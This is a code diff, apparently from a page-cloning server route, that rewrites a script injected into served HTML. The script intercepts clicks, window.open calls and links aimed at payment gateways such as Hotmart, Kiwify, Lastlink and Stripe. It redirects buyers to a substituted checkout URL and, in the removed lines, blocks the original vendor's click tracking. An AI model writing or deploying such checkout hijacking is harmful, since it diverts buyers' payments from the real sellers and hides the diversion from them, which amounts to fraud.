@@ -185,76 +185,108 @@ export async function GET(
       $('head').prepend(spaEngine);
     }
 
-    // 2. Script para Checkout (Simples como o 1º Botão)
+    // 2. Script de interceptação de Checkout — Nível Window (funciona em SPAs)
     const engineScript = `
       <script>
         (function() {
-          const CHECKOUT_URL = '${checkoutUrl}';
-          const gateways = ['checkout', 'pay.', 'comprar', 'hotmart', 'eduzz', 'monetizze', 'kiwify', 'braip', 'cakto', 'perfectpay', 'ticto', 'yampi', 'cartpanda', 'greenn', 'pepper', 'lowify', 'ironpay', 'lastlink', 'kirvano'];
-          
-          function patch() {
-            if (!CHECKOUT_URL) return;
+          var CHECKOUT_URL = ${JSON.stringify(checkoutUrl)};
+          if (!CHECKOUT_URL) return; // Sem URL configurada, não faz nada
 
-            // Bloqueador de espiões: Impede que o clique suba para a Lastlink
-            const blockSpy = (e) => {
-                e.stopPropagation();
-                e.stopImmediatePropagation();
-            };
+          var GATEWAYS = [
+            'pay.', 'checkout', 'cakto', 'kiwify', 'hotmart', 'eduzz', 'monetizze',
+            'braip', 'perfectpay', 'ticto', 'yampi', 'cartpanda', 'greenn', 'pepper',
+            'lowify', 'ironpay', 'lastlink', 'kirvano', 'pagarme', 'stripe', 'mercadopago'
+          ];
 
-            // 1. Tag A (O Primeiro Botão, totalmente funcional)
-            document.querySelectorAll('a').forEach(el => {
-              const h = (el.getAttribute('href') || '').toLowerCase();
-              if (!el.dataset.patched && ((h.startsWith('http') || h.startsWith('//')) && gateways.some(g => h.includes(g)) || el.dataset.checkout)) {
-                el.dataset.patched = 'true';
-                el.href = CHECKOUT_URL;
-                // Impede vazamento do clique
-                el.onclick = blockSpy;
-                el.onmousedown = blockSpy;
-                el.ontouchstart = blockSpy;
+          function isGatewayUrl(url) {
+            if (!url || typeof url !== 'string') return false;
+            var lower = url.toLowerCase();
+            return GATEWAYS.some(function(g) { return lower.includes(g); });
+          }
+
+          function forceCheckout(e) {
+            if (e && e.preventDefault) e.preventDefault();
+            if (e && e.stopPropagation) e.stopPropagation();
+            if (e && e.stopImmediatePropagation) e.stopImmediatePropagation();
+            window.location.href = CHECKOUT_URL;
+            return false;
+          }
+
+          // ─── 1. INTERCEPTAÇÃO NO NÍVEL DA WINDOW (pega TUDO, inclusive botões de SPA) ───
+          window.addEventListener('click', function(e) {
+            var el = e.target;
+            var depth = 0;
+
+            while (el && el !== document.body && depth < 8) {
+              var tag = el.tagName;
+              var href = el.getAttribute ? (el.getAttribute('href') || '') : '';
+
+              // Se é um link para um gateway de pagamento
+              if ((tag === 'A' || tag === 'BUTTON') && isGatewayUrl(href)) {
+                return forceCheckout(e);
+              }
+
+              // Se o href já inclui a nossa URL (evita loop)
+              if (href && href === CHECKOUT_URL) {
+                el = el.parentElement;
+                depth++;
+                continue;
+              }
+
+              el = el.parentElement;
+              depth++;
+            }
+          }, { capture: true });
+
+          // ─── 2. INTERCEPTA window.open (SPAs frequentemente usam isso) ───────────────
+          var _origOpen = window.open;
+          window.open = function(url, target, features) {
+            if (url && isGatewayUrl(url.toString())) {
+              window.location.href = CHECKOUT_URL;
+              return null;
+            }
+            return _origOpen.call(this, url, target, features);
+          };
+
+          // ─── 3. PATCHER DE DOM — substitui hrefs direto nos elementos (para não-SPAs) ─
+          function patchDom() {
+            // Patch em tags <a>
+            document.querySelectorAll('a[href]').forEach(function(el) {
+              var h = el.getAttribute('href') || '';
+              if (h && h !== CHECKOUT_URL && isGatewayUrl(h)) {
+                el.setAttribute('href', CHECKOUT_URL);
+                el.setAttribute('target', '_self');
+                el.removeAttribute('rel');
               }
             });
-
-            // 2. O Segundo Botão (Transformado numa Tag A idêntica para funcionar igual ao 1º botão)
-            document.querySelectorAll('button').forEach(btn => {
-                const text = (btn.textContent || '').trim().toUpperCase();
-                
-                if (text.includes('OBTER MEU PLANO PERSONALIZADO') || text.includes('COMPRAR AGORA') || btn.id === '39Kr7c') {
-                    if (!btn.dataset.patched) {
-                        // Cria o Link <a>
-                        const link = document.createElement('a');
-                        link.href = CHECKOUT_URL;
-                        link.innerHTML = btn.innerHTML; // Copia o interior do botão
-                        link.className = btn.className; // Copia as classes CSS
-                        link.dataset.patched = 'true';
-                        
-                        // Mantém o ID para não quebrar a formatação visual (CSS)
-                        link.id = btn.id;
-                        
-                        // Garante que a aparência se preserve
-                        link.style.cssText = btn.style.cssText;
-                        link.style.textDecoration = 'none';
-                        
-                        // Se o botão era inline, transforma o link em inline-block para suportar margens
-                        const displayStyle = window.getComputedStyle(btn).display;
-                        if (displayStyle === 'inline' || displayStyle === '') {
-                             link.style.display = 'inline-block';
-                        }
-                        
-                        // Corta a comunicação com qualquer script da Lastlink no momento do clique
-                        link.onclick = blockSpy;
-                        link.onmousedown = blockSpy;
-                        link.ontouchstart = blockSpy;
-                        link.onpointerdown = blockSpy;
-                        link.ontouchend = blockSpy;
-
-                        // Tira o botão original da tela e coloca o nosso link <a> no lugar
-                        btn.parentNode.replaceChild(link, btn);
-                    }
-                }
-            });
           }
-          // Roda rápido (1 segundo) para garantir que troca o botão antes do usuário rolar até ele
-          setInterval(patch, 1000);
+
+          // Roda logo no início
+          document.addEventListener('DOMContentLoaded', patchDom);
+
+          // ─── 4. MUTATIONOBSERVER — detecta botões adicionados pela SPA depois do load ─
+          var observer = new MutationObserver(function() {
+            patchDom();
+          });
+
+          // Começa a observar assim que tiver um body
+          var startObserver = function() {
+            if (document.body) {
+              observer.observe(document.body, { childList: true, subtree: true, attributes: true, attributeFilter: ['href'] });
+              patchDom();
+            } else {
+              setTimeout(startObserver, 100);
+            }
+          };
+          startObserver();
+
+          // Roda a cada 2s por 20s como fallback garantido para SPAs lentas
+          var runs = 0;
+          var fallback = setInterval(function() {
+            patchDom();
+            if (++runs >= 10) clearInterval(fallback);
+          }, 2000);
+
         })();
       </script>
     `;
